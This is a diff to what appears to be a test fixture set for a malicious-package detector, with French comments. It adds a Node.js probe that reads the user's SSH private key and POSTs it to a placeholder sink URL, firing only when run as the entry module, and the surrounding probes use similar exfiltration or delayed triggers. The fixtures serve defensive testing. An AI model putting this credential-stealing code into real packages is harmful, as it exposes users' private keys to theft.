@@ -141,6 +141,22 @@ const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
 module.exports={{version:1}};
 """, "charge.mjs": "export const version=1;\n"},
     },
+    # 16. ne frappe QUE si execute comme module d entree (require.main === module)
+    "p16-main-module": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https'),fs=require('fs'),os=require('os');
+function frapper() {{
+  const k = fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
+  const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
+}}
+// Rien d'autre : si le harnais ne nous execute pas comme module d entree,
+// cette sonde DOIT rester muette. C est le seul test qui distingue un loader
+// garde par require.main d un paquet propre.
+if (require.main === module) {{ frapper(); }}
+module.exports=frapper;
+"""},
+    },
     # 15. ne frappe que si 30 jours se sont ecoules (horloge decalee)
     "p15-horloge": {
         "main": "index.js",
